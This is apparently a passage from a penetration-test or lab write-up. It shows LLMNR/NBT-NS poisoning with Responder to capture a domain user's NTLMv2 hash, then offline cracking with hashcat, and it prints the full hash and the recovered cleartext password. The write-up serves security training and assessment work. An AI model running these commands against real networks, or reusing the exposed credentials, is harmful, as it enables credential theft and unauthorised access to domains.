Used the Responder tool to capture password hash for the wley user by spoofing NBT-NS/LLMNR traffic on the local network segment.
```shell-session
$sudo responder -I ens224 -wrfv

                                         __

  .----.-----.-----.-----.-----.-----.--|  |.-----.----.

  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|

  |__| |_____|_____|   __|_____|__|__|_____||_____|__|

                   |__|



           NBT-NS, LLMNR & MDNS Responder 3.0.6.0

<SNIP>
[+] Generic Options:

    Responder NIC              [ens224]

    Responder IP               [172.16.5.225]

    Challenge set              [random]

    Don't Respond To Names     ['ISATAP']



[+] Current Session Variables:

    Responder Machine Name     [WIN-LGE120I9VVM]

    Responder Domain Name      [LZ0B.LOCAL]

    Responder DCE-RPC Port     [47085]

[!] Error starting SSL server on port 443, check permissions or other servers running.

[!] Error starting TCP server on port 80, check permissions or other servers running.

[!] Error starting TCP server on port 3389, check permissions or other servers running.



[+] Listening for events...

<SNIP>

[SMB] NTLMv2-SSP Client   : 172.16.5.130
[SMB] NTLMv2-SSP Username : INLANEFREIGHT\wley
[SMB] NTLMv2-SSP Hash     : wley::INLANEFREIGHT:e176550f8260f7c9:220D30E7626572B220ABC6B5D2E8E1C9:010100000000000080B4A81EA6D1DA01637CA265874CD9AA00000000020008004C005A003000420001001E00570049004E002D004C004700450031003200300049003900560056004D0004003400570049004E002D004C004700450031003200300049003900560056004D002E004C005A00300042002E004C004F00430041004C00030014004C005A00300042002E004C004F00430041004C00050014004C005A00300042002E004C004F00430041004C000700080080B4A81EA6D1DA01060004000200000008003000300000000000000000000000003000007F555577D97571DF8B6FB792B197FA2C3A8F4B0F9AB443173BA1EEBB2387E1FF0A001000000000000000000000000000000000000900220063006900660073002F003100370032002E00310036002E0035002E003200320035000000000000000000

<SNIP>
```

The tester was able to "crack" this password hash offline using the hash cat tool and retrieve the clear text password value, thus granting a foothold to enumerate the Active Directory domain.
```shell-session
hashcat -m 5600 wley_hash /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting

<SNIP>

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

WLEY::INLANEFREIGHT:e176550f8260f7c9:220d30e7626572b220abc6b5d2e8e1c9:010100000000000080b4a81ea6d1da01637ca265874cd9aa00000000020008004c005a003000420001001e00570049004e002d004c004700450031003200300049003900560056004d0004003400570049004e002d004c004700450031003200300049003900560056004d002e004c005a00300042002e004c004f00430041004c00030014004c005a00300042002e004c004f00430041004c00050014004c005a00300042002e004c004f00430041004c000700080080b4a81ea6d1da01060004000200000008003000300000000000000000000000003000007f555577d97571df8b6fb792b197fa2c3a8f4b0f9ab443173ba1eebb2387e1ff0a001000000000000000000000000000000000000900220063006900660073002f003100370032002e00310036002e0035002e003200320035000000000000000000:Cargonet2
```